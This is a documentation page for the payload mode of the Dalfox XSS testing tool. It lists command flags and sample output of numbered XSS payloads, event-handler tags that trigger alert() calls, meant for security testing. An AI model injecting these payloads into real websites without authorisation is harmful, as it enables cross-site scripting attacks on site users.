---
title: Payload Mode
redirect_from: /docs/modes/payload-mode/
has_children: false
parent: Usage
nav_order: 5
toc: true
layout: page
---

# Payload Mode

`payload` mode is a mode for easy testing of XSS. Generate and Enumerate XSS Payloads and wordlists

```bash
dalfox payload {flags}
```

e.g
```bash
dalfox payload --enum-injs --entity-event-handler"
```

## Make-Bulk
Make-bulk generates many xss payloads. At this point, the parameters of the alert are configured as sequence and it is easy to find which payload was triggered during the XSS test.

```bash
dalfox payload --make-bulk
```

output

```html
...snip...
<track onbeforepaste=\"alert(488)\" contenteditable>test<\/track>
<tt onbeforepaste=\"alert(489)\" contenteditable>test<\/tt>
<u onbeforepaste=\"alert(490)\" contenteditable>test<\/u>
<ul onbeforepaste=\"alert(491)\" contenteditable>test<\/ul>
<var onbeforepaste=\"alert(492)\" contenteditable>test<\/var>
<video onbeforepaste=\"alert(493)\" contenteditable>test<\/video>
<wbr onbeforepaste=\"alert(494)\" contenteditable>test<\/wbr>
<xmp onbeforepaste=\"alert(495)\" contenteditable>test<\/xmp>
<body onbeforeprint=alert(496)>
<svg><path><animateMotion onbegin=alert(497) dur=\"1s\" repeatCount=\"1\">
<svg><animatetransform onbegin=alert(498) attributeName=transform>
<svg><set onbegin=alert(499) attributename=x dur=1s>
<svg><animate onbegin=alert(500) attributeName=x dur=1s>
<input onblur=alert(501) id=x><input autofocus>
<textarea onblur=alert(502) id=x><\/textarea><input autofocus>
...snip...
```

## Encoder
```bash
--encoder-url            Encoding output [URL]
```

## Supported
```bash
--entity-event-handler   Enumerate a event handlers for xss
--entity-gf              Enumerate a gf-patterns xss params
--entity-special-chars   Enumerate a special chars for xss
--entity-useful-tags     Enumerate a useful tags for xss
--enum-attr              Enumerate a in-attr xss payloads
--enum-common            Enumerate a common xss payloads
--enum-html              Enumerate a in-html xss payloads
--enum-injs              Enumerate a in-js xss payloads
--make-bulk              Make bulk payloads for stored xss
--remote-payloadbox      Enumerate a payloadbox's xss payloads
--remote-portswigger     Enumerate a portswigger xss cheatsheet payloads
```

## Screenshots
![1414](https://user-images.githubusercontent.com/13212227/120361642-0b9e1000-c345-11eb-8283-9c0b7fdac8b3.jpg)
